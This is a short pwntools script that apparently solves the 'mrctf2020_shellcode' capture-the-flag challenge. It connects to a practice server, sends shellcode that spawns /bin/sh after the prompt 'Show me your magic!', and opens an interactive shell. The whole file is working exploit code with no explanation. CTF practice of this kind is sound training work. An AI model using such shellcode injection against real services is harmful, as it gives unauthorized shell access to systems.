from pwn import *


def mrctf2020_shellcode(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/mrctf2020_shellcode'):
    print('mrctf2020_shellcode start')
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 26698)

    payload = flat([asm(shellcraft.sh())])
    target.sendlineafter('Show me your magic!', payload)

    target.interactive()
    print('mrctf2020_shellcode end')


if __name__ == '__main__':
    mrctf2020_shellcode()
